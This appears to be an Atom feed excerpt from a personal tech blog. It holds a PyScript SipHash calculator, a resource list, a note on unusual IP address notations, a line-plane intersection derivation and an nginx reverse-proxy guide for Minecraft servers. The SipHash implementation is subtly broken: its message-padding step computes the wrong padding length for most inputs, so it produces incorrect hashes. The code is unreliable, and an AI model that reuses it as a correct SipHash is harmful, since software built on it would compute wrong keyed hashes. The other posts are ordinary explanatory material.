<h2 id="references">References</h2>

<ol class="bibliography"><li><span id="siphash">Aumasson, J.-P., &amp; Bernstein, D. J. (2012). SipHash: A Fast Short-Input PRF. In S. Galbraith &amp; M. Nandi (Eds.), <i>Progress in Cryptology - INDOCRYPT 2012</i> (pp. 489–508). Springer Berlin Heidelberg.</span></li></ol>

<py-script>
from pyodide import create_proxy

from typing import List, Tuple
import binascii

def big_to_little8(num: int) -&gt; int:
    """
    Convert 8-byte big endian integer to little endian integer to work with bitwise operations.

    Parameters
    ----------
    num : int
        Integer to be converted
    
    Returns
    -------
    int
        Converted integer
    """
    return int.from_bytes(num.to_bytes(8, 'big'), 'little')

def rotl8(num: int, bits: int) -&gt; int:
    """
    Bitwise left-rotate of a 8-byte number.

    Parameters
    ----------
    num : int
        Number to be left-rotated
    bits : int
        Number of bits to be left-rotated
    
    Returns
    -------
    int
        Left-rotated number
    """
    return ((num &lt;&lt; bits) &amp; 0xffffffffffffffff) | (num &gt;&gt; (64 - bits))

class SipHash:

    # TODO: Change ways to pass parameters in a more object-oriented way.
    
    """
    Implemented following the algorithm in (Aumasson and Bernstein, 2012).

    Aumasson, JP., Bernstein, D.J. (2012). SipHash: A Fast Short-Input PRF.
    In: Galbraith, S., Nandi, M. (eds) Progress in Cryptology - INDOCRYPT 2012.
    INDOCRYPT 2012. Lecture Notes in Computer Science, vol 7668.
    Springer, Berlin, Heidelberg. https://doi.org/10.1007/978-3-642-34931-7_28
    """

    def __init__(self, key: int, message: bytes, c=2, d=4) -&gt; None:
        """
        Initialise SipHash with a key and message.

        Parameters
        ----------
        key : int
            16-byte big-endian key
        message : bytes
            Message to be hashed in big-endian bytes
        c : int
            Number of compression rounds
        d : int
            Number of finalization round
        """
        self.key = key
        self.message = message
        self.c = c
        self.d = d
        self.hash = None

    def get_hash(self) -&gt; int:
        """
        Return hash of the message hashed with the key.

        Return from saved value if the hash has been calculated, or calculate the hash value and save it and return.

        Returns
        -------
        int
            Hash value in little-endian
        """
        if self.hash is None:        
            k0, k1 = self._encode_key(self.key)
            internal_state = self._initialise_internal_state(k0, k1)
            internal_state = self._compress(self.message, internal_state)
            self.hash = self._finalise(internal_state)
        return self.hash

    def hexdigest(self) -&gt; str:
        """
        Return the hex string of the hash.

        Returns
        -------
        str
            Hex string of the hash
        """
        return hex(self.get_hash())[2:]

    def _encode_key(self, key: int) -&gt; Tuple[int, int]:
        """
        Encode 16-byte key into 8-byte k0 and k1.

        Parameters
        ----------
        key : int
            16-byte big-endian key

        Returns
        -------
        (bytes, bytes)
            Tuple of k0 and k1
        """
        return (big_to_little8(key &gt;&gt; 8 * 8), big_to_little8(key &amp; 0xffffffffffffffff))

    def _initialise_internal_state(self, k0: int, k1: int) -&gt; Tuple[int, int, int, int]:
        """
        Initialise internal state v0, v1, v2, v3.

        Parameters
        ----------
        k0 : int
            8-byte k0
        k1 : int
            8-byte k1

        Returns
        -------
        (int, int, int, int)
            Internal state v0, v1, v2, v3
        """
        c1 = 0x736f6d6570736575
        c2 = 0x646f72616e646f6d
        c3 = 0x6c7967656e657261
        c4 = 0x7465646279746573
        v0 = k0 ^ int(c1)
        v1 = k1 ^ int(c2)
        v2 = k0 ^ int(c3)
        v3 = k1 ^ int(c4)
        return (v0, v1, v2, v3)

    def _compress(self, message: bytes, internal_state: Tuple[int, int, int, int]) -&gt; Tuple[int, int, int, int]:
        """
        Compress the message into internal state.

        Parameters
        ----------
        message : bytes
            Message to be hashed in big endian bytes
        internal_state : (int, int, int, int)
            Internal state v0, v1, v2, v3

        Returns
        -------
        (int, int, int, int)
            Internal state with message compressed into
        """
        words = self._message_to_words(message)

        v0, v1, v2, v3 = internal_state
        for word in words:
            v3 ^= word
            for _ in range(self.c):
                v0, v1, v2, v3 = self._sipround((v0, v1, v2, v3))
            v0 ^= word
        
        return (v0, v1, v2, v3)

    def _message_to_words(self, message: bytes) -&gt; List[int]:
        """
        Parse message into words

        Parameters
        ----------
        message : bytes
            Message to be hashed in big endian bytes

        Returns
        -------
        [int]
            Message parsed into little-endian words
        """
        message_length = len(message)
        padding_length = (message_length + 1) % 8
        message = message + b'\x00' * padding_length + (message_length % 256).to_bytes(1, 'little')
        return [int.from_bytes(message[i: i + 8], 'little') for i in range(0, len(message), 8)]

    def _sipround(self, internal_state: Tuple[int, int, int, int]) -&gt; Tuple[int, int, int, int]:
        """
        SipRound to transform internal state.

        Parameters
        ----------
        internal_state : (int, int, int, int)
            Internal state v0, v1, v2, v3

        Returns
        -------
        (int, int, int, int)
            Internal state v0, v1, v2, v3 after SipRound transform
        """
        v0, v1, v2, v3 = internal_state

        v0 = (v0 + v1) &amp; 0xffffffffffffffff
        v1 = rotl8(v1, 13)
        v1 ^= v0
        v0 = rotl8(v0, 32)
        v2 = (v2 + v3) &amp; 0xffffffffffffffff
        v3 = rotl8(v3, 16)
        v3 ^= v2
        v2 = (v2 + v1) &amp; 0xffffffffffffffff
        v1 = rotl8(v1, 17)
        v1 ^= v2
        v2 = rotl8(v2, 32)
        v0 = (v0 + v3) &amp; 0xffffffffffffffff
        v3 = rotl8(v3, 21)
        v3 ^= v0

        return (v0, v1, v2, v3)

    def _finalise(self, internal_state: Tuple[int, int, int, int]) -&gt; int:
        """
        Finalise SipHash

        Parameters
        ----------
        internal_state : (int, int, int, int)
            Internal state before finalise

        Returns
        -------
        int
            SipHash result in little-endian representation
        """
        v0, v1, v2, v3 = internal_state
        v2 ^= 0xff
        for _ in range(self.d):
            v0, v1, v2, v3 = self._sipround((v0, v1, v2, v3))
        return v0 ^ v1 ^ v2 ^ v3

def update_hash(event):
    document.getElementById('error').hidden = True
    try:
        message_type = document.getElementById('messageType').value
        message = document.getElementById('message').value
        match message_type:
            case 'Text':
                message = bytes(message, 'utf8')
            case 'Hex':
                message = bytes.fromhex(message)
            case 'Base64':
                message = binascii.a2b_base64(message)

        key_type = document.getElementById('keyType').value
        key = document.getElementById('key').value
        match key_type:
            case 'Text':
                key = int.from_bytes(bytes(key, 'utf-8'), 'big')
            case 'Hex':
                key = int(key, 16)
            case 'Decimal':
                key = int(key)
            case 'Base64':
                key = int.from_bytes(binascii.a2b_base64(key), 'big')

        hash_type = document.getElementById('hashType').value
        hash_output = document.getElementById('hash')
        c = int(document.getElementById('c').value)
        d = int(document.getElementById('d').value)
        siphash = SipHash(key, message, c, d)
        match hash_type:
            case 'Hex':
                hash_output.value = siphash.hexdigest()
            case 'Decimal':
                hash_output.value = siphash.get_hash()
            case 'Base64':
                hash_output.value = binascii.b2a_base64(siphash.get_hash().to_bytes(8, 'big')).decode('utf-8')
    except:
        document.getElementById('error').hidden = False

on_update = create_proxy(update_hash)

def calculate(event):
    event.preventDefault()
    update_hash(event)

on_calculate = create_proxy(calculate)

document.getElementById('calculate').onclick = on_calculate

input_ids = ['message', 'messageType', 'key', 'keyType', 'c', 'd', 'hashType']
for input_id in input_ids:
    document.getElementById(input_id).addEventListener('input', on_update)
</py-script>

<script defer="" src="https://pyscript.net/alpha/pyscript.js"></script>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Awesome Collection</title><link href="https://www.cjxol.com/posts/awesome-collection/" rel="alternate" type="text/html" title="Awesome Collection" /><published>2022-06-17T00:00:00+01:00</published><updated>2022-06-17T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/awesome-collection</id><content type="html" xml:base="https://www.cjxol.com/posts/awesome-collection/"><![CDATA[<p>This post is being continuously updated with a collection of good learning resources.</p>

<p><small>Last updated on 18th June 2022.</small></p>

<h2 id="legendres-symbol">Legendre’s Symbol</h2>

<p>A good video by Michael Penn showing proof of the Legendre’s Symbol: <a href="https://www.youtube.com/watch?v=eKjjAr4EvmU">https://www.youtube.com/watch?v=eKjjAr4EvmU</a> (and good backflip) that kept me interested throughout the entire video.</p>

<p><a href="https://cryptohack.org/courses/modular/root1/">A challenge on CryptoHack</a> uses Legendre’s Symbol and more to find the quadratic residue and calculate the square root.</p>

<h2 id="tcp-transmission">TCP Transmission</h2>

<p>Video explaining TCP handshake and transmission step-by-step: <a href="https://youtu.be/v3m9F9nEpCA?t=862">https://youtu.be/v3m9F9nEpCA?t=862</a> by kanak (Connor Nelson) from <a href="https://pwn.college/">pwn.college</a> (ASU CSE 365).</p>]]></content><author><name></name></author><category term="continuously updated" /><summary type="html"><![CDATA[This post is being continuously updated with a collection of good learning resources.]]></summary></entry><entry><title type="html">Things Blow Up My Mind</title><link href="https://www.cjxol.com/posts/things-blow-up-my-mind/" rel="alternate" type="text/html" title="Things Blow Up My Mind" /><published>2022-05-13T00:00:00+01:00</published><updated>2022-05-13T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/things-blow-up-my-mind</id><content type="html" xml:base="https://www.cjxol.com/posts/things-blow-up-my-mind/"><![CDATA[<p>This post is being continuously updated with random things I come across.</p>

<p><small>Last updated on 13th May 2022.</small></p>

<h2 id="totally-legit-ip-address">Totally Legit IP Address</h2>

<p>Do you know you can do <code class="highlighter-rouge">ping 0177.0x10.01</code> (which pings 127.16.0.1)?</p>

<p>Or even <code class="highlighter-rouge">ping 2130706433</code> (127.0.0.1 in dword) (<a href="https://www.youtube.com/watch?v=PT_qEhesKW8&amp;lc=Ugz5183SkhDLxzW5Mf14AaABAg.9av7AJhjNVy9aw2sVU3iaf">dono’s comment</a>) or <code class="highlighter-rouge">http://2130706433</code>.</p>

<p>See <a href="https://www.youtube.com/watch?v=PT_qEhesKW8">Hussein Nasser’s YouTube video</a>.</p>]]></content><author><name></name></author><category term="continuously updated" /><summary type="html"><![CDATA[This post is being continuously updated with random things I come across.]]></summary></entry><entry><title type="html">Checking if Line and Plane Intersect</title><link href="https://www.cjxol.com/posts/line-plane-intersection/" rel="alternate" type="text/html" title="Checking if Line and Plane Intersect" /><published>2022-03-05T00:00:00+00:00</published><updated>2022-03-05T00:00:00+00:00</updated><id>https://www.cjxol.com/posts/line-plane-intersection</id><content type="html" xml:base="https://www.cjxol.com/posts/line-plane-intersection/"><![CDATA[<p>The post is compiled with information on <a href="https://en.wikipedia.org/wiki/Line%E2%80%93plane_intersection">Wikipedia page on Line-plane Interaction</a> and <a href="https://web.ma.utexas.edu/users/m408m/Display12-5-4.shtml">this notes on finding the normal to a plane</a>.</p>

<h2 id="what-is-the-question">What is the question?</h2>

<p>This post is about checking if a line intersect with a plane, given 2 different coordinates on the line and 3 different coordinates on the plane.</p>

<h2 id="how-to-solve-it">How to solve it?</h2>

<p>Suppose having a line with coordinates <script type="math/tex">\mathbf{a}</script> and <script type="math/tex">\mathbf{b}</script> on the line, the vector equation representing the line with the set of <script type="math/tex">\mathbf{p}</script> consist the line is:
\begin{equation}
\label{eq:line}
\mathbf{p} = \mathbf{a} + d \mathbf{(b - a)}
\end{equation}</p>

<p>Suppose having a plane with coordinates <script type="math/tex">\mathbf{e}</script>, <script type="math/tex">\mathbf{f}</script> and <script type="math/tex">\mathbf{g}</script> on the plane, then the normal to the plane is <script type="math/tex">\mathbf{n = (f - e) \times (g - e)}</script>. If <script type="math/tex">\mathbf{p_0}</script> is a point on the plane (e.g. <script type="math/tex">\mathbf{p_0}</script> can be <script type="math/tex">\mathbf{e}</script>, <script type="math/tex">\mathbf{f}</script> or <script type="math/tex">\mathbf{g}</script>), the plane can be expressed as the set of points <script type="math/tex">\mathbf{p}</script> for which:
\begin{equation}
\label{eq:plane}
\mathbf{(p - p_0) \cdot n} = 0
\end{equation}</p>

<p>The point(s) where the line and the plane intersect, the points have the same coordinates. Substitute \eqref{eq:line} into \eqref{eq:plane}:</p>

<script type="math/tex; mode=display">% <![CDATA[
\begin{align*}
((\mathbf{a} + d \mathbf{(b - a)}) - \mathbf{p_0}) \cdot \mathbf{n} &= 0\\
d \mathbf{(b - a)} \cdot \mathbf{n} + \mathbf{(a - p_0)} \cdot \mathbf{n} &= 0\\
d &= \frac{\mathbf{(p_0 - a)} \cdot \mathbf{n}}{\mathbf{(b - a)} \cdot \mathbf{n}}
\end{align*} %]]></script>

<p>If <script type="math/tex">\mathbf{(b - a)} \cdot \mathbf{n} = 0</script> then the line and the plane are parallel. In this case, if <script type="math/tex">\mathbf{(p_0 - a)} \cdot \mathbf{n} = 0</script> then the line is on the plane. Otherwise the line and plane have no intersection.</p>

<p>If <script type="math/tex">\mathbf{(b - a)} \cdot \mathbf{n} \neq 0</script> there is a single point of intersection.</p>]]></content><author><name></name></author><category term="maths" /><category term="analytic geometry" /><category term="computer graphics" /><summary type="html"><![CDATA[The post is compiled with information on Wikipedia page on Line-plane Interaction and this notes on finding the normal to a plane.]]></summary></entry><entry><title type="html">Set up Reverse Proxy for Minecraft Servers</title><link href="https://www.cjxol.com/posts/minecraft-reverse-proxy/" rel="alternate" type="text/html" title="Set up Reverse Proxy for Minecraft Servers" /><published>2020-06-29T00:00:00+01:00</published><updated>2020-06-29T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/minecraft-reverse-proxy</id><content type="html" xml:base="https://www.cjxol.com/posts/minecraft-reverse-proxy/"><![CDATA[<p>This post is about how to set up a reverse proxy for Minecraft server (or for TCP in general) with Nginx.</p>

<p>I have done this on Ubuntu 18.04 with Nginx and <code class="highlighter-rouge">libngxin-mod-stream</code> installed from the default repositories using <code class="highlighter-rouge">apt</code>. I set up the reverse proxy for some private Minecraft servers running Spigot 1.15.2 and Paper 1.15.2 with Waterfall, and it does not require any changes on the Minecraft server. <strong>Many of the public servers have rules that DO NOT allow connecting to their servers through a proxy</strong>.</p>

<h2 id="why">Why?</h2>

<p><img src="/assets/image/minecraft-reverse-proxy.png" alt="Reverse proxy can improve connection." /></p>

<p>When playing with friends on the Minecraft server <code class="highlighter-rouge">server.example.com</code>, if the route between someone’s client and the server has a bad connection with high ping and high packet loss, the gaming experience would not be great or even not able to connect.</p>

<p>However, if there is be a server location with better connections to both that client and the server, and it could possibly be used as a proxy to improve the gaming experience.</p>

<h2 id="how">How?</h2>

<h3 id="prerequisite">Prerequisite</h3>

<p>Nginx and <code class="highlighter-rouge">libnginx-mod-stream</code> installed (either from package repositories or compiled from source).</p>

<h3 id="configurations">Configurations</h3>

<p>Assuming the Minecraft server is running on <code class="highlighter-rouge">server.example.com</code> and port <code class="highlighter-rouge">25565</code>.</p>

<p>Some of the commands might require <code class="highlighter-rouge">sudo</code> privilege.</p>

<p>On the sever used for reverse proxy, edit the Nginx config file, normally located at <code class="highlighter-rouge">/etc/nginx/nginx.conf</code> on Ubuntu if installed with <code class="highlighter-rouge">apt</code>, add the config below:</p>

<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stream</span> {
    <span class="n">server</span> {
        <span class="c"># Port number the reverse proxy is listening on
</span>        <span class="n">listen</span>  <span class="m">25565</span>;
        <span class="c"># The original Minecraft server address
</span>        <span class="n">proxy_pass</span>  <span class="n">server</span>.<span class="n">example</span>.<span class="n">com</span>:<span class="m">25565</span>;
    }
}

</code></pre></div></div>

<p>Reload Nginx:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service nginx reload
</code></pre></div></div>

<p>In case firewall is enabled, run the following command to allow connections:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ufw allow 25565/tcp
</code></pre></div></div>

<h3 id="connect-to-the-reverse-proxy">Connect to the reverse proxy</h3>

<p>To connect via the reverse proxy, connect with Minecraft client as usual, however use the proxy server’s address and port number instead of the original server’s, and in this case it is <code class="highlighter-rouge">proxy.example.com:25565</code>. Clients are still able to connect directly to the original server without using the reverse proxy with the original address and port number.</p>

<p>If the port number is the default 25565, it can be omitted in the client. In case the port number is not the default 25565, it is possible to <a href="https://www.spigotmc.org/threads/guide-setting-up-srv-records.52303/">set up a SRV record on DNS</a> to avoid specifying the port number in the client (this step is optional).</p>

<h2 id="conclusions">Conclusions</h2>

<p>There are several advantages setting up the reverse proxy this way:</p>

<ul>
  <li>It does not require to modify anything on the Minecraft server itself, as long as it allows the clients to connect to it through a proxy.</li>
  <li>It does not require any special setup on the clients, just to use the reverse proxy’s address instead of the original Minecraft server’s address when connecting in Minecraft.</li>
  <li>It works for many different Minecraft server and client version.</li>
  <li>It still allows the clients to connect directly to the Minecraft server. It is useful when some of the clients has better connection to the original server.</li>
</ul>

<p>This setup is easy to understand and config, also requires little server resource. It is also possible to use access control from Nginx or iptables etc..</p>

<p>There are limitations of this setup too. It simply works as a TCP reverse proxy, and it does not do some fancy stuff like connecting multiple Minecraft servers together. Also again, <strong>it SHOULD NOT be used if the Minecraft server has rule that does not allow clients to connect through a proxy</strong>.</p>]]></content><author><name></name></author><category term="how to" /><summary type="html"><![CDATA[This post is about how to set up a reverse proxy for Minecraft server (or for TCP in general) with Nginx.]]></summary></entry></feed>